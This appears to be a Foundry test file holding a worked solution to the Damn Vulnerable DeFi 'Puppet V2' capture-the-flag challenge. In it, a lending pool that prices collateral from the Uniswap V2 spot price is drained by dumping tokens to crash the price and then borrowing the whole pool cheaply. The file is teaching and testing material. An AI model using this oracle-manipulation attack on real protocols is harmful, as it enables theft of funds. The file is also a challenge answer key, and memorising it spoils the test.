// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

/**
 * PUPPET V2 CHALLENGE
 * -------------------
 * Same concept as Puppet V1, but upgraded to Uniswap V2 and WETH collateral.
 *
 * PuppetV2Pool lends DVT tokens against WETH collateral.
 * It calculates required collateral using the Uniswap V2 spot price:
 *   collateral = (borrowAmount * wethReserve / tokenReserve) * 3
 *
 * The vulnerability is identical to V1: the pool blindly trusts the Uniswap
 * spot price with no TWAP protection, so we can manipulate it in the same tx.
 *
 * Initial reserves: 100 DVT / 10 WETH → 1 DVT = 0.1 WETH
 * Initial collateral to borrow 1M DVT: 300,000 WETH
 *
 * Attack:
 *   1. Dump all 10,000 player DVT into Uniswap → crashes DVT price
 *   2. Wrap all ETH to WETH (our ETH + ETH received from dump)
 *   3. Use the now-tiny collateral requirement to borrow all 1M DVT
 *   4. Transfer borrowed tokens to recovery
 */
contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player   = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;      // 100 DVT seeded into Uniswap
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE  = 10e18;       // 10 WETH seeded into Uniswap → price: 1 DVT = 0.1 WETH
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE  = 10_000e18;   // player holds 10,000 DVT (100x Uniswap reserve)
    uint256 constant PLAYER_INITIAL_ETH_BALANCE    = 20e18;       // player holds 20 ETH
    uint256 constant POOL_INITIAL_TOKEN_BALANCE    = 1_000_000e18;// lending pool holds 1 million DVT — our target

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;  // the DVT/WETH pair — also used as price oracle by the pool
    PuppetV2Pool lendingPool;

    // Runs the solution as player, then verifies win conditions
    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy DVT token and WETH
        token = new DamnValuableToken();
        weth  = new WETH();

        // Deploy Uniswap V2 Factory (address(0) = no fee recipient)
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );

        // Deploy Uniswap V2 Router, linking it to the factory and WETH
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create the DVT/WETH pair and seed it with 100 DVT + 10 ETH
        // This sets the initial price: 1 DVT = 0.1 ETH (or 0.3 WETH collateral per DVT borrowed)
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,       // deployer receives the LP tokens
            deadline: block.timestamp * 2
        });

        // Get the address of the newly created DVT/WETH pair
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool — it uses uniswapV2Exchange as its price oracle
        lendingPool = new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Fund player and lending pool
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // At initial price (1 DVT = 0.1 WETH), the pool requires 0.3 WETH per DVT (3x ratio)
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        // Borrowing the full 1M DVT would normally require 300,000 WETH — we have far less
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
    }

    /**
     * SOLUTION
     *
     * STEP 1 — Crash the DVT price on Uniswap
     *   Player has 10,000 DVT vs Uniswap's reserve of only 100 DVT.
     *   Dumping 10,000 DVT (100x the reserve) causes extreme slippage:
     *   tokenReserve goes from 100 → ~10,100 DVT
     *   wethReserve goes from 10 → ~0.099 WETH  (constant product: 100*10 = 10100*x → x ≈ 0.099)
     *   New price: 1 DVT ≈ 0.0000098 WETH — almost worthless.
     *
     * STEP 2 — Wrap all ETH into WETH
     *   We receive ~9.9 ETH back from the Uniswap dump.
     *   Combined with our starting 20 ETH, we now have ~29.9 ETH.
     *   Wrap it all to WETH so we can use it as collateral.
     *
     * STEP 3 — Borrow all 1M DVT at the manipulated price
     *   After the crash, borrowing 1M DVT requires only ~29.5 WETH (down from 300,000 WETH).
     *   We have enough WETH to cover this, so we drain the entire pool.
     *
     * STEP 4 — Send borrowed tokens to recovery
     */
    function test_puppetV2() public checkSolvedByPlayer {
        // ---- STEP 1: Dump all DVT into Uniswap to crash the price ----
        // Approve router to spend all our DVT
        token.approve(address(uniswapV2Router), type(uint256).max);

        // Define the swap path: DVT → WETH
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        // Swap all 10,000 DVT for ETH.
        // minOut = 9 ETH as slippage guard (we expect ~9.9 ETH back).
        // ETH is sent directly to player address.
        uniswapV2Router.swapExactTokensForETH(
            token.balanceOf(player), // sell all player DVT
            9 ether,                 // minimum ETH to receive
            path,
            player,                  // ETH recipient
            block.timestamp          // deadline
        );

        // ---- STEP 2: Wrap all ETH into WETH ----
        // player.balance now = original 20 ETH + ~9.9 ETH from swap ≈ 29.9 ETH
        // WETH.deposit() wraps native ETH into ERC20 WETH, needed for pool collateral
        weth.deposit{value: player.balance}();

        // ---- STEP 3: Borrow all 1M DVT at the crashed price ----
        // Recalculate required WETH collateral using the now-manipulated oracle price.
        // This will be far less than the original 300,000 WETH.
        uint256 poolBalance          = token.balanceOf(address(lendingPool));
        uint256 depositOfWETHRequired = lendingPool.calculateDepositOfWETHRequired(poolBalance);

        // Approve the pool to pull the required WETH collateral from us
        weth.approve(address(lendingPool), depositOfWETHRequired);

        // Borrow the entire pool balance — collateral is pulled automatically
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        // ---- STEP 4: Send all borrowed DVT to recovery ----
        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}